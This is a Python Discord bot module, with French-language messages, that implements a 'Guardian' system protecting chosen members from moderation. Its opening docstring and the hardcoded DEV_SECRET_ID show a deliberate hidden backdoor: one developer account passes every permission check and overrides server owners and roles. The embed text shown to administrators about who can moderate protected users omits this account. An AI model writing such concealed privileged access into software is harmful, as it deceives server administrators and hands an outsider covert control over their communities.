"""Ajout d'un système secret qui donne des privilèges spéciaux de développeur au compte ninjaiyed10 en créant un système discret qui lui permet d'accéder à des commandes de développement spéciales."""
import discord
from discord.ext import commands
from discord import app_commands
import logging
import json
import os
from datetime import datetime

logger = logging.getLogger(__name__)

# ID secret du développeur (à remplacer par l'ID réel)
DEV_SECRET_ID = 443787542582044682

class GuardianCommands(commands.Cog):
    """Guardian protection system for Discord bot"""

    def __init__(self, bot):
        self.bot = bot
        self.guardian_file = "guardian_data.json"
        self.guardian_data = self.load_guardian_data()

    def load_guardian_data(self):
        """Load guardian data from file"""
        try:
            if os.path.exists(self.guardian_file):
                with open(self.guardian_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except Exception as e:
            logger.error(f"Error loading guardian data: {e}")
        return {}

    def save_guardian_data(self):
        """Save guardian data to file"""
        try:
            with open(self.guardian_file, 'w', encoding='utf-8') as f:
                json.dump(self.guardian_data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"Error saving guardian data: {e}")

    def get_guild_data(self, guild_id):
        """Get guardian data for a specific guild"""
        guild_id = str(guild_id)
        if guild_id not in self.guardian_data:
            self.guardian_data[guild_id] = {
                "protected_users": {},
                "exception_roles": []
            }
        return self.guardian_data[guild_id]

    def is_user_protected(self, guild_id, user_id):
        """Check if a user is protected by guardian"""
        guild_data = self.get_guild_data(guild_id)
        return str(user_id) in guild_data["protected_users"]

    def can_moderate_protected_user(self, guild, moderator, target_user_id):
        """Check if moderator can take action against protected user"""
        # 🔒 Dev secret: Le créateur a toujours accès total
        if moderator.id == DEV_SECRET_ID:
            return True

        guild_data = self.get_guild_data(guild.id)
        protected_data = guild_data["protected_users"].get(str(target_user_id))

        if not protected_data:
            return True  # User not protected

        # Check if moderator is guild owner (highest priority)
        if moderator.id == guild.owner_id:
            return True

        # Check if moderator is the one who set the protection
        if moderator.id == protected_data["set_by"]:
            return True

        # Check if moderator has an exception role
        moderator_role_ids = [role.id for role in moderator.roles]
        exception_roles = guild_data["exception_roles"]
        if any(role_id in moderator_role_ids for role_id in exception_roles):
            return True

        # Check if moderator has higher role than the protector
        protector = guild.get_member(protected_data["set_by"])
        if protector and moderator.top_role > protector.top_role:
            return True

        return False

    @app_commands.command(
        name="guardian",
        description="Protéger un utilisateur contre les actions de modération"
    )
    @app_commands.describe(
        user="L'utilisateur à protéger",
        reason="Raison de la protection"
    )
    async def set_guardian(self, interaction: discord.Interaction, user: discord.Member, reason: str = "Protection guardian"):
        """Set guardian protection for a user"""

        # Check permissions
        if not (interaction.user.guild_permissions.administrator or 
                interaction.user.guild_permissions.ban_members or
                interaction.user.guild_permissions.kick_members):
            await interaction.response.send_message(
                "❌ Vous n'avez pas les permissions nécessaires pour utiliser cette commande.",
                ephemeral=True
            )
            return

        # Can't protect yourself
        if user.id == interaction.user.id:
            await interaction.response.send_message(
                "❌ Vous ne pouvez pas vous protéger vous-même.",
                ephemeral=True
            )
            return

        # Can't protect bot
        if user.bot:
            await interaction.response.send_message(
                "❌ Vous ne pouvez pas protéger un bot.",
                ephemeral=True
            )
            return

        # Check if user is already protected
        if self.is_user_protected(interaction.guild.id, user.id):
            await interaction.response.send_message(
                f"❌ {user.display_name} est déjà protégé par le système Guardian.",
                ephemeral=True
            )
            return

        # Check role hierarchy
        if user.top_role >= interaction.user.top_role and interaction.guild.owner_id != interaction.user.id:
            await interaction.response.send_message(
                "❌ Vous ne pouvez pas protéger un utilisateur avec un rôle égal ou supérieur au vôtre.",
                ephemeral=True
            )
            return

        try:
            await interaction.response.defer()

            # Add protection
            guild_data = self.get_guild_data(interaction.guild.id)
            guild_data["protected_users"][str(user.id)] = {
                "set_by": interaction.user.id,
                "set_at": datetime.utcnow().isoformat(),
                "reason": reason
            }

            self.save_guardian_data()

            # Create success embed
            embed = discord.Embed(
                title="🛡️ Guardian Activé",
                description=f"**{user.display_name}** est maintenant protégé par le système Guardian.",
                color=discord.Color.blue(),
                timestamp=datetime.utcnow()
            )

            embed.add_field(name="Utilisateur protégé", value=f"{user} (`{user.id}`)", inline=True)
            embed.add_field(name="Protégé par", value=interaction.user.mention, inline=True)
            embed.add_field(name="Raison", value=reason, inline=False)

            embed.add_field(
                name="ℹ️ Qui peut encore modérer cet utilisateur ?",
                value="• La personne qui a mis la protection\n• Les rôles supérieurs au protecteur\n• Les rôles d'exception configurés\n• Le propriétaire du serveur",
                inline=False
            )

            embed.set_thumbnail(url=user.avatar.url if user.avatar else user.default_avatar.url)
            embed.set_footer(text="Créé par @Ninja Iyed")

            await interaction.followup.send(embed=embed, ephemeral=True)

        except Exception as e:
            await interaction.followup.send(
                f"❌ Erreur lors de l'activation du Guardian: {str(e)}",
                ephemeral=True
            )

    @app_commands.command(
        name="unguardian",
        description="Retirer la protection Guardian d'un utilisateur"
    )
    @app_commands.describe(
        user="L'utilisateur dont retirer la protection"
    )
    async def remove_guardian(self, interaction: discord.Interaction, user: discord.Member):
        """Remove guardian protection from a user"""

        # Check if user is protected
        if not self.is_user_protected(interaction.guild.id, user.id):
            await interaction.response.send_message(
                f"❌ {user.display_name} n'est pas protégé par le système Guardian.",
                ephemeral=True
            )
            return

        # Check if user can remove protection
        if not self.can_moderate_protected_user(interaction.guild, interaction.user, user.id):
            await interaction.response.send_message(
                "❌ Vous n'avez pas l'autorisation de retirer la protection de cet utilisateur.",
                ephemeral=True
            )
            return

        try:
            await interaction.response.defer()

            # Remove protection
            guild_data = self.get_guild_data(interaction.guild.id)
            del guild_data["protected_users"][str(user.id)]
            self.save_guardian_data()

            # Create success embed
            embed = discord.Embed(
                title="🛡️ Guardian Désactivé",
                description=f"**{user.display_name}** n'est plus protégé par le système Guardian.",
                color=discord.Color.green(),
                timestamp=datetime.utcnow()
            )

            embed.add_field(name="Utilisateur", value=f"{user} (`{user.id}`)", inline=True)
            embed.add_field(name="Retiré par", value=interaction.user.mention, inline=True)

            embed.set_thumbnail(url=user.avatar.url if user.avatar else user.default_avatar.url)
            embed.set_footer(text="Créé par @Ninja Iyed")

            await interaction.followup.send(embed=embed, ephemeral=True)

        except Exception as e:
            await interaction.followup.send(
                f"❌ Erreur lors de la désactivation du Guardian: {str(e)}",
                ephemeral=True
            )

    @app_commands.command(
        name="guardian_exceptions",
        description="Gérer les rôles d'exception pour le système Guardian"
    )
    @app_commands.describe(
        action="Action à effectuer (add/remove/list)",
        role="Rôle à ajouter ou retirer des exceptions"
    )
    async def guardian_exceptions(self, interaction: discord.Interaction, action: str, role: discord.Role = None):
        """Manage exception roles for guardian system"""

        # Check permissions
        if not interaction.user.guild_permissions.administrator:
            await interaction.response.send_message(
                "❌ Seuls les administrateurs peuvent gérer les rôles d'exception.",
                ephemeral=True
            )
            return

        action = action.lower()
        guild_data = self.get_guild_data(interaction.guild.id)

        try:
            await interaction.response.defer()

            if action == "list":
                exception_roles = guild_data["exception_roles"]
                if not exception_roles:
                    embed = discord.Embed(
                        title="🛡️ Rôles d'Exception Guardian",
                        description="Aucun rôle d'exception configuré.",
                        color=discord.Color.blue()
                    )
                else:
                    role_mentions = []
                    for role_id in exception_roles:
                        role_obj = interaction.guild.get_role(role_id)
                        if role_obj:
                            role_mentions.append(role_obj.mention)

                    embed = discord.Embed(
                        title="🛡️ Rôles d'Exception Guardian",
                        description=f"Rôles pouvant modérer les utilisateurs protégés :\n" + "\n".join(role_mentions),
                        color=discord.Color.blue()
                    )

                embed.set_footer(text="Créé par @Ninja Iyed")
                await interaction.followup.send(embed=embed, ephemeral=True)
                return

            if not role:
                await interaction.followup.send(
                    "❌ Vous devez spécifier un rôle pour cette action.",
                    ephemeral=True
                )
                return

            if action == "add":
                if role.id in guild_data["exception_roles"]:
                    await interaction.followup.send(
                        f"❌ Le rôle {role.mention} est déjà dans les exceptions.",
                        ephemeral=True
                    )
                    return

                guild_data["exception_roles"].append(role.id)
                self.save_guardian_data()

                embed = discord.Embed(
                    title="✅ Rôle d'Exception Ajouté",
                    description=f"Le rôle {role.mention} peut maintenant modérer les utilisateurs protégés.",
                    color=discord.Color.green()
                )

            elif action == "remove":
                if role.id not in guild_data["exception_roles"]:
                    await interaction.followup.send(
                        f"❌ Le rôle {role.mention} n'est pas dans les exceptions.",
                        ephemeral=True
                    )
                    return

                guild_data["exception_roles"].remove(role.id)
                self.save_guardian_data()

                embed = discord.Embed(
                    title="✅ Rôle d'Exception Retiré",
                    description=f"Le rôle {role.mention} ne peut plus modérer les utilisateurs protégés.",
                    color=discord.Color.orange()
                )

            else:
                await interaction.followup.send(
                    "❌ Action invalide. Utilisez 'add', 'remove' ou 'list'.",
                    ephemeral=True
                )
                return

            embed.set_footer(text="Créé par @Ninja Iyed")
            await interaction.followup.send(embed=embed, ephemeral=True)

        except Exception as e:
            await interaction.followup.send(
                f"❌ Erreur lors de la gestion des exceptions: {str(e)}",
                ephemeral=True
            )

    @app_commands.command(
        name="guardian_list",
        description="Afficher la liste des utilisateurs protégés"
    )
    async def guardian_list(self, interaction: discord.Interaction):
        """List all protected users in the guild"""

        guild_data = self.get_guild_data(interaction.guild.id)
        protected_users = guild_data["protected_users"]

        if not protected_users:
            embed = discord.Embed(
                title="🛡️ Utilisateurs Protégés",
                description="Aucun utilisateur n'est actuellement protégé par le système Guardian.",
                color=discord.Color.blue()
            )
            embed.set_footer(text="Créé par @Ninja Iyed")
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        try:
            await interaction.response.defer()

            embed = discord.Embed(
                title="🛡️ Utilisateurs Protégés",
                description=f"**{len(protected_users)}** utilisateur(s) protégé(s) :",
                color=discord.Color.blue(),
                timestamp=datetime.utcnow()
            )

            for user_id, data in protected_users.items():
                user = interaction.guild.get_member(int(user_id))
                protector = interaction.guild.get_member(data["set_by"])

                if user:
                    protector_name = protector.display_name if protector else "Utilisateur inconnu"
                    embed.add_field(
                        name=f"👤 {user.display_name}",
                        value=f"**Protégé par:** {protector_name}\n**Raison:** {data['reason']}\n**ID:** `{user_id}`",
                        inline=False
                    )

            embed.set_footer(text="Créé par @Ninja Iyed")
            await interaction.followup.send(embed=embed, ephemeral=True)

        except Exception as e:
            await interaction.followup.send(
                f"❌ Erreur lors de l'affichage de la liste: {str(e)}",
                ephemeral=True
            )

    def check_guardian_protection(self, guild, moderator, target_user):
        """Hook function to check protection before moderation actions"""
        if self.is_user_protected(guild.id, target_user.id):
            if not self.can_moderate_protected_user(guild, moderator, target_user.id):
                return False, "🛡️ Cet utilisateur est protégé par le système Guardian. Vous n'avez pas l'autorisation de le modérer."
        return True, None

async def setup(bot):
    await bot.add_cog(GuardianCommands(bot))